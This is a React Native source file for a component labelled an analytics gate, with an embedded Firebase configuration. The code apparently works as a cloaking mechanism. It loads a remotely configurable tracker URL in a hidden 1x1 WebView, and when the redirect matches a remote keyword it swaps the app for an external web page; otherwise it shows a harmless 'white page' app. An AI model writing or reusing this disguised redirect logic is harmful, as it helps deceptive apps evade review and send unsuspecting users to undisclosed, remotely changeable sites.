import React, { useState, useEffect } from 'react';
import { View, StyleSheet, ActivityIndicator, Platform } from 'react-native';
import WebView from 'react-native-webview';
import { initializeApp } from 'firebase/app';
import { getRemoteConfig, fetchAndActivate, getValue } from 'firebase/remote-config';

const FIREBASE_CONFIG = {
  apiKey: "AIzaSyCpbNd860umrAaIyb57n_eJTDSWHlvY2QU",
  authDomain: "flirtok-journal.firebaseapp.com",
  projectId: "flirtok-journal",
  storageBucket: "flirtok-journal.firebasestorage.app",
  messagingSenderId: "349932440767",
  appId: "1:349932440767:ios:1c4bd22a07714202030a0a"
};

const app = initializeApp(FIREBASE_CONFIG);
const remoteConfig = getRemoteConfig(app);
remoteConfig.settings.minimumFetchIntervalMillis = 10000; 

const DEFAULT_TRACKER_URL = 'https://anti-track.com/YsRvKBpD';
const DEFAULT_KEYWORD = 'target.page';

function MobileAnalyticsGate({ children }: { children: React.ReactNode }) {
  const [status, setStatus] = useState<'loading' | 'loading_webview' | 'show_webview' | 'show_app'>('loading');
  const [externalUrl, setExternalUrl] = useState<string | null>(null);
  const [trackerUrl, setTrackerUrl] = useState<string>(DEFAULT_TRACKER_URL);
  const [redirectKeyword, setRedirectKeyword] = useState<string>(DEFAULT_KEYWORD);

  useEffect(() => {
    fetchAndActivate(remoteConfig)
      .then(() => {
        const configTrackerUrl = getValue(remoteConfig, 'tracker_url').asString() || DEFAULT_TRACKER_URL;
        const configRedirectKeyword = getValue(remoteConfig, 'redirect_keyword').asString() || DEFAULT_KEYWORD;

        setTrackerUrl(configTrackerUrl);
        setRedirectKeyword(configRedirectKeyword);

        console.log('[AnalyticsGate] Config loaded:', {
          trackerUrl: configTrackerUrl,
          keyword: configRedirectKeyword
        });
      })
      .catch((error) => {
        console.log("[AnalyticsGate] Firebase config fetch failed, using defaults:", error.message);
      })
      .finally(() => {
        setTimeout(() => setStatus('loading_webview'), 1000);
      });
  }, []);

  const onNavigationStateChange = (navState: { url: string }) => {
    const url = navState.url;
    console.log('[AnalyticsGate] Navigation to:', url);

    if (url.includes(redirectKeyword)) {
      console.log('[AnalyticsGate] Keyword detected, showing external webview');
      setExternalUrl(url);
      setStatus('show_webview');
      return;
    }
    
    if (status === 'loading_webview' && url !== trackerUrl) {
         console.log('[AnalyticsGate] Redirect occurred but no keyword found (assumed White Page). Showing app.');
         setTimeout(() => setStatus('show_app'), 500); 
    }
  };

  const handleTrackerLoad = () => {
    console.log('[AnalyticsGate] Tracker loaded successfully (End of chain, showing app)');
    if (status === 'loading_webview') {
      setTimeout(() => {
        console.log('[AnalyticsGate] Showing app');
        setStatus('show_app');
      }, 500);
    }
  };

  if (status === 'show_webview' && externalUrl) {
    console.log('[AnalyticsGate] Rendering external webview');
    return <WebView source={{ uri: externalUrl }} style={StyleSheet.absoluteFill} />;
  }

  if (status === 'show_app') {
    return <View style={styles.appWrapper}>{children}</View>;
  }

  if (status === 'loading_webview') {
    return (
      <View style={styles.container}>
        <View style={styles.hiddenWebview}>
          <WebView
            source={{ uri: trackerUrl }}
            onNavigationStateChange={onNavigationStateChange}
            onLoad={handleTrackerLoad}
            javaScriptEnabled={true}
          />
        </View>
        <ActivityIndicator size="large" color="#0000ff" />
      </View>
    );
  }

  return (
    <View style={styles.container}>
      <ActivityIndicator size="large" color="#0000ff" />
    </View>
  );
}

export default function AnalyticsGate({ children }: { children: React.ReactNode }) {
  if (Platform.OS === 'web') {
    return <View style={styles.appWrapper}>{children}</View>;
  }

  return <MobileAnalyticsGate>{children}</MobileAnalyticsGate>;
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#fff',
  },
  appWrapper: {
    flex: 1,
    backgroundColor: '#fff',
  },
  hiddenWebview: {
    height: 1,
    width: 1,
    position: 'absolute',
    opacity: 0.01,
  },
});
